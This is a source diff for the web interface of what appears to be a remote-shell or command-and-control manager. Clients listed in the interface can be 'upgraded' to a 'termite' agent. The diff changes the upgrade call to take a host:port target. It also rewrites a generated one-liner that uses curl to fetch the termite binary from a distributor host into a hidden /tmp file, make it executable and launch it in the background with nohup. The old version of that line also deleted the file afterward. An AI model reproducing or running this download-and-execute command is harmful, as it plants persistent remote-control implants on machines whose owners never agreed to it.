@@ -49,9 +49,9 @@ let apiUrl = [baseUrl, "/api"].join("");
 let wsUrl = ["ws://", endPoint, "/notify"].join("");
 
 
-function upgradeToTermite(clientHash, serverHash) {
+function upgradeToTermite(clientHash, target) {
   axios
-    .get(apiUrl + "/client/" + clientHash + "/upgrade/" + serverHash)
+    .get(apiUrl + "/client/" + clientHash + "/upgrade/" + target)
     .then((response) => {
       console.log(response)
     })
@@ -288,19 +288,19 @@ class App extends React.Component {
         render: (data, line, index) => {
           let upgradeButton;
           if (line.CurrentProcessKey === undefined) {
-            let encryptedServerHash = null
+            let target = null
             this.state.serversList.forEach(function(entry){
               if (entry.encrypted) {
-                encryptedServerHash = entry.hash
+                target = entry.host + ":" + entry.port
               }
             })
-            if (encryptedServerHash == null) {
-              upgradeButton = <Button disabled={true} onClick={() => upgradeToTermite(line.hash, encryptedServerHash)}>
+            if (target == null) {
+              upgradeButton = <Button disabled={true} onClick={() => upgradeToTermite(line.hash, target)}>
               Upgrade
             </Button>
 
             } else {
-              upgradeButton = <Button onClick={() => upgradeToTermite(line.hash, encryptedServerHash)}>
+              upgradeButton = <Button onClick={() => upgradeToTermite(line.hash, target)}>
               Upgrade
             </Button>
             }
@@ -400,12 +400,12 @@ class App extends React.Component {
         hintTabs = <Tabs defaultActiveKey="0">
           {this.state.distributor.interfaces.map((value, index) => {
             let url = "http://" + value + ":" + this.state.distributor.port
-            let command, filename, path
+            let command, filename, target
             let data = []
             Object.values(this.state.currentServer.interfaces).map((value, index) => {
               filename = "/tmp/." + randomstring.generate(4)
-              path = this.state.distributor.route[value + ":" + this.state.currentServer.port]
-              command = "curl -fsSL " + url + "/" + path + "/termite -o " + filename + " && chmod +x " + filename + " && bash -c '/usr/bin/nohup " + filename + " &' && rm -rf " + filename
+              target = value + ":" + this.state.currentServer.port
+              command = "curl -fsSL " + url + "/termite/"  + target + " -o " + filename + " && chmod +x " + filename + " && bash -c '/usr/bin/nohup " + filename + " &'"
               data.push({ target: value + ":" + this.state.currentServer.port, command: command })
               return command
             })
